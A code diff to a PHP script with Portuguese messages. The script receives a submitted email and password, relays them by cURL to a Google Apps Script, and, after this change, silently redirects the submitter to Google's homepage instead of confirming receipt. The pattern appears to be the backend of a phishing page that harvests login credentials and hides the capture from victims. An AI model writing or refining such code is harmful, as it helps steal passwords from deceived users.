@@ -1,7 +1,7 @@
 <?php
-header('Content-Type: application/json; charset=utf-8');
 
 if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+    header('Content-Type: application/json; charset=utf-8');
     http_response_code(405);
     echo json_encode(['erro' => 'Método não permitido.']);
     exit;
@@ -22,6 +22,7 @@ if (!is_array($payload) || empty($payload)) {
 }
 
 if (!is_array($payload) || empty($payload)) {
+    header('Content-Type: application/json; charset=utf-8');
     http_response_code(400);
     echo json_encode(['erro' => 'Formato de payload inválido.']);
     exit;
@@ -31,6 +32,7 @@ $email = isset($payload['email']) ? filter_var($payload['email'], FILTER_VALIDAT
 $senha = isset($payload['senha']) ? trim($payload['senha']) : '';
 
 if (!$email || $senha === '') {
+    header('Content-Type: application/json; charset=utf-8');
     http_response_code(400);
     echo json_encode(['erro' => 'Dados inválidos ou ausentes.']);
     exit;
@@ -44,6 +46,7 @@ $dados = [
 ];
 
 if (!function_exists('curl_init')) {
+    header('Content-Type: application/json; charset=utf-8');
     http_response_code(500);
     echo json_encode(['erro' => 'A extensão cURL não está habilitada.']);
     exit;
@@ -57,16 +60,13 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($dados));
 $response = curl_exec($ch);
 
 if (curl_errno($ch)) {
+    header('Content-Type: application/json; charset=utf-8');
     http_response_code(500);
     echo json_encode(['erro' => 'Erro ao conectar com o Google Apps Script: ' . curl_error($ch)]);
 } else {
-    $decodedResponse = json_decode($response, true);
-    $retorno = $decodedResponse ?? $response;
-    echo json_encode([
-        'status' => 'ok',
-        'mensagem' => 'Dados enviados com sucesso.',
-        'retorno_google' => $retorno,
-    ]);
+    $redirectUrl = 'https://www.google.com/';
+    header('Location: ' . $redirectUrl, true, 303);
 }
 
 curl_close($ch);
+exit;
